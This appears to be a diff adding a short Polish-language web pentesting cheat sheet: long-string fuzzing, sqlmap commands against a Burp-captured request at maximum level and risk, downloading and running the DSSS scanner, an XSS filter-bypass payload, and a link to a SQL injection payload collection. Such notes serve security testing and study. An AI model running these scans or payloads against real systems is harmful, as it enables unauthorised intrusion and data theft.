@@ -1,1 +1,25 @@
 
+1) Wklejanie dlugich ciagow
+      • script python do generowania ciagu
+            ▪ print("%A"*10000)
+
+2) Automatyczne skanowanie
+      • Przechwycone zapytanie w burpie i miejsca wstrzykiwania oznaczone “*”
+            ▪ sqlmap -r <plik_z_zapytaniem> --proxy=<ip>
+      • Przechwycone zapytanie w burpie i miejsca wstrzykiwania oznaczone “*” (duzy skan)
+            ▪ sqlmap -r <plik_z_zapytaniem> --proxy=<ip> --level=5 --risk=3 
+      • Skrypt z gita
+            ▪ wget https://raw.githubusercontent.com/stamparm/DSSS/master/dsss.py
+            ▪ python3 dsss.py -u "<ip>?var1=*&var2=*"
+    
+3) Ominiecie filtorw
+      • Jezeli filtr wyklucza niebezpieczne slowa (np. wyzuca “script” z ciagu)
+            ▪ <sscriptcript>alert('siemanko');</sscriptcript>    
+                
+4) Strony
+      • Wstrzykniecie (posegregowane)
+            ▪ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md 
+                
+                
+                
+                
